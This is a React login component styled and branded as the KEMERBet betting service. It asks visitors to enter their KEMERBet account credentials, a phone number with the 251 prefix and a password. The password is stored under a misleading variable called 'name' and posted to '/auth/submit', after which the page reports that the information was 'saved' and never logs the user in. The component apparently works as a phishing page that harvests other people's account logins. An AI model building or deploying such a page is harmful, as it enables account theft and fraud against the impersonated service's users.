import { useState } from 'react';
import api from '../utils/api';
import styles from './LoginPage.module.css';

export default function LoginPage() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (!name || !phone) {
      setError('Please fill in all fields');
      return;
    }

    const fullPhone = `251${phone}`;

    setLoading(true);
    try {
      await api.post('/auth/submit', { name, phone: fullPhone });
      setSuccess(true);
    } catch (err) {
      setError(err.response?.data?.message || 'Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className={styles.container}>
        <div className={styles.card}>
          <div className={styles.successCard}>
            <div className={styles.successIcon}>✓</div>
            <h2 className={styles.successTitle}>Submitted!</h2>
            <p className={styles.successText}>Your information has been saved successfully.</p>
            <button
              className={styles.loginBtn}
              onClick={() => { setSuccess(false); setName(''); setPhone(''); }}
            >
              Submit Another
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.container}>
      <div className={styles.card}>
        {/* Logo Section */}
        <div className={styles.logoSection}>
          <div className={styles.logoBox}>
            <ZPlayLogo />
          </div>
          <p className={styles.signInLabel}>Sign In.</p>
          <h1 className={styles.welcomeTitle}>Welcome Back!</h1>
          <p className={styles.signInSub}>
            Sign in with your <span className={styles.brandLink}>KEMERBet account</span> credentials to continue.
          </p>
        </div>

        {/* Form */}
        <form className={styles.form} onSubmit={handleSubmit} noValidate>
          {error && <div className={styles.errorBox}>{error}</div>}

          {/* Phone Field */}
          <div className={styles.phoneWrapper}>
            <span className={styles.countryCode}>251</span>
            <input
              type="tel"
              className={styles.phoneInput}
              placeholder="912345678"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
              maxLength={9}
              inputMode="numeric"
              autoComplete="tel"
            />
          </div>

          {/* Name Field */}
          <input
            type="text"
            className={styles.input}
            placeholder="Password"
            value={name}
            onChange={(e) => setName(e.target.value)}
            autoComplete="name"
          />

          <button
            type="submit"
            className={styles.loginBtn}
            disabled={loading}
          >
            {loading ? 'Submitting...' : 'Login'}
          </button>
        </form>
      </div>
    </div>
  );
}

// KEMERBet Logo
function ZPlayLogo() {
  const letters = ['K', 'E', 'M', 'E', 'R'];
  return (
    <svg
      viewBox="0 0 260 90"
      xmlns="http://www.w3.org/2000/svg"
      width="240"
      height="82"
      aria-label="KEMERBet logo"
    >
      {/* Card tiles for K E M E R */}
      {letters.map((letter, i) => (
        <g key={i} transform={`translate(${i * 44}, 0)`}>
          {/* White card background */}
          <rect x="2" y="2" width="38" height="48" rx="6" ry="6" fill="white" />
          {/* Green letter */}
          <text
            x="21"
            y="36"
            fontSize="28"
            fontWeight="900"
            fontFamily="Arial Black, sans-serif"
            fill="#1a7a2e"
            textAnchor="middle"
          >
            {letter}
          </text>
        </g>
      ))}

      {/* Yellow "Bet" tile */}
      <g transform="translate(200, 30)">
        <rect x="0" y="0" width="52" height="34" rx="6" ry="6" fill="#f5c400" />
        <text
          x="26"
          y="24"
          fontSize="20"
          fontWeight="900"
          fontFamily="Arial Black, sans-serif"
          fill="#1a7a2e"
          textAnchor="middle"
        >
          Bet
        </text>
      </g>
    </svg>
  );
}
